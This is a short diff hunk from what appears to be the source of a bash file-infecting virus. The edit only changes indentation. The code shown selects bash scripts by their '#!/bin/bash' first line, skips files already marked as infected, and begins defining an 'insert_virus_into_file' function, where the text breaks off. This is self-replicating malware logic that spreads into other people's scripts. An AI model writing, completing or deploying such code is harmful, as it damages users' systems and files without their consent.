@@ -26,12 +26,12 @@ do
 	
 	# It's contain "#!/bin/bash" in first line
 	if !(head -n 1 $OBJECT | grep -q $BASH_FILE_FIRST_LINE); then
-	    continue
+		continue
 	fi
 	
 	# It's not yet infected.
 	if grep -q "$VIRUS_BODY_START_MARKER" $OBJECT ; then
-	    continue
+		continue
 	fi
 	
 	insert_virus_into_file() {
